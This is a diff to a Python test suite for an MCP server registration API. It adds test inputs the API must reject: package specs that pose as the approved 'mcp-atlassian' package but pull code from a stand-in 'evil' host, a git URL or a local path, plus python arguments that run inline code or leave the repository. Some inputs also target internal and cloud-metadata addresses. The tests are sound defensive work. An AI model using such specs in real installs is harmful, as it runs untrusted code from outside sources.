@@ -51,6 +51,7 @@ class RouteTests(unittest.TestCase):
         self.patches = [
             mock.patch.object(mm, "CONFIG_FILE", self.cfg_file),
             mock.patch.object(mm, "audit_log", lambda *a, **k: None),
+            mock.patch.object(mm, "check_url", lambda u: u),   # no DNS in tests
             mock.patch.object(deps, "audit_log", lambda *a, **k: None),
             mock.patch.object(mm.credentials, "set_token", lambda k, v: self.keychain.__setitem__(k, v)),
             mock.patch.object(mm.credentials, "get_token", lambda k: self.keychain.get(k)),
@@ -131,7 +132,7 @@ class RouteTests(unittest.TestCase):
         self.assertNotIn("k:env:API_KEY", self.keychain)
 
     def test_duplicate_and_delete(self):
-        body = {"name": "d", "command": "node", "args": ["s.js"]}
+        body = {"name": "d", "command": "python", "args": ["core/echo_mcp_server.py"]}
         self.assertEqual(self.client.post("/mcp/servers", json=body).status_code, 200)
         self.assertEqual(self.client.post("/mcp/servers", json=body).status_code, 409)
         self.assertEqual(self.client.delete("/mcp/servers/d").status_code, 200)
@@ -209,6 +210,11 @@ class RouteTests(unittest.TestCase):
             {"name": "j", "transport": "http", "url": "https://localhost/mcp"},
             {"name": "k", "transport": "http", "url": "https://10.0.0.5/mcp"},
             {"name": "l", "transport": "http", "url": "https://169.254.169.254/latest"},
+            # spec tricks that reduce to the approved name but install something else
+            {"name": "m", "command": "npx", "args": ["-y", "mcp-atlassian@npm:evil"]},
+            {"name": "n", "command": "npx", "args": ["mcp-atlassian@git+https://evil/x.git"]},
+            {"name": "o", "command": "uvx", "args": ["mcp-atlassian @ https://evil/x.whl"]},
+            {"name": "p", "command": "npx", "args": ["mcp-atlassian@file:../evil"]},
         ]
         for body in bad:
             r = self.client.post("/mcp/servers", json={**body, "scope": "user"})
@@ -234,12 +240,17 @@ class RouteTests(unittest.TestCase):
         self.assertEqual(self.client.delete("/mcp/servers/mine?scope=user").status_code, 200)
         self.assertEqual(self.user_db, {})
 
+    def test_admin_script_commands_limited_to_repo_files(self):
+        for args in (["-c", "print(1)"], ["-m", "http.server"], ["../../outside.py"], []):
+            r = self.client.post("/mcp/servers", json={"name": "s", "command": "python", "args": args})
+            self.assertEqual(r.status_code, 400, args)
+
     def test_admin_picks_scope(self):
         # admin: personal servers skip the package allowlist, global name clash is refused
         self.client.post("/mcp/servers", json={"name": "shared", "command": "npx", "args": ["srv"]})
         r = self.client.post("/mcp/servers", json={"name": "shared", "scope": "user", "command": "npx", "args": ["srv"]})
         self.assertEqual(r.status_code, 409)
-        r = self.client.post("/mcp/servers", json={"name": "own", "scope": "user", "command": "node", "args": ["s.js"],
+        r = self.client.post("/mcp/servers", json={"name": "own", "scope": "user", "command": "python", "args": ["core/echo_mcp_server.py"],
                                                     "secret_env": {"K": SECRET}})
         self.assertEqual(r.status_code, 200, r.text)
         self.assertEqual(self.keychain["u1:own:env:K"], SECRET)
@@ -249,8 +260,8 @@ class RouteTests(unittest.TestCase):
         self.assertEqual(sorted((s["name"], s["scope"]) for s in listing["servers"]),
                          [("own", "user"), ("shared", "global")])
         # edit personal keeps it personal; bad scope rejected
-        r = self.client.put("/mcp/servers/own", json={"name": "own", "scope": "user", "command": "node",
-                                                       "args": ["s.js"], "secret_env": {"K": ""}})
+        r = self.client.put("/mcp/servers/own", json={"name": "own", "scope": "user", "command": "python",
+                                                       "args": ["core/echo_mcp_server.py"], "secret_env": {"K": ""}})
         self.assertEqual(r.status_code, 200, r.text)
         self.assertEqual(self.user_db[(1, "own")]["secret_env_keys"], ["K"])
         self.assertEqual(self.client.post("/mcp/servers", json={"name": "z", "scope": "team", "command": "npx"}).status_code, 400)
